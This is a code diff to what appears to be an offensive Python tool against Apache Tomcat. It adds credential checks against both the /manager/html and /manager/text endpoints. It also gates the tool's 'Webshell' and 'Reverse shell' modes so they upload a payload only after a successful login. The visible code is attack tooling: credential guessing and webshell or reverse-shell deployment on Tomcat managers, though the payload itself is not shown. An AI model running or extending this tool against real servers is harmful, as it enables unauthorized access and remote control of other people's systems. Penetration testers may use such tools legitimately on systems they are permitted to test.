@@ -78,13 +78,28 @@ class Tomcat:
 
     def login(self, username, password):
         auth = HTTPBasicAuth(username, password)
-        response = requests.get(f"{self.url}/manager/html", auth=auth)
+
+        endpoint = '/manager/html'
+        response = requests.get(f"{self.url}{endpoint}", auth=auth)
+
         if response.status_code == 200:
-            output.message(state="success", description=f"{username}:{password}", url="")
+            output.message(state="success", description=f"{username}:{password}", url=endpoint, manager='gui')
             return username, password
-        else:
-            output.message(state="failed", description=f"{username}:{password}", url="", verbose=True)
-            return None
+        elif response.status_code == 401:
+            output.message(state="failed", description=f"{username}:{password}", url=endpoint)
+        elif response.status_code == 404:
+            output.message(state="failed", description=f"Can't find /manager/html [Error 404]", url=endpoint)
+
+        endpoint = '/manager/text'
+        response = requests.get(f"{self.url}{endpoint}", auth=auth)
+
+        if response.status_code == 200:
+            output.message(state="success", description=f"{username}:{password}", url=endpoint, manager='script')
+            return username, password
+        elif response.status_code == 401:
+            output.message(state="failed", description=f"{username}:{password}", url=endpoint)
+        elif response.status_code == 404:
+            output.message(state="failed", description=f"Can't find /manager/text [Error 404]", url=endpoint)
 
 
 class UnauthenticatedAttack(Tomcat):
@@ -355,8 +370,11 @@ def main():
             else:
                 output.message("success", "Mode Webshell selected", "")
                 webshell = AuthenticatedAttack(url=args.url, username=args.user, password=args.password)
-                webshell.login(username=args.user, password=args.password)
-                webshell.upload()
+                login_granted = webshell.login(username=args.user, password=args.password)
+                if login_granted:
+                    webshell.upload()
+                else:
+                    return
 
         # settings for reverse mode
         case 'reverse':
@@ -365,9 +383,11 @@ def main():
             else:
                 output.message("success", "Mode Reverse shell selected", "")
                 revereshell = AuthenticatedAttack(url=args.url, username=args.user, password=args.password)
-                revereshell.login(username=args.user, password=args.password)
-                revereshell.upload()
-
+                login_granted = revereshell.login(username=args.user, password=args.password)
+                if login_granted:
+                    revereshell.upload()
+                else:
+                    return
 
 if __name__ == "__main__":
     main()
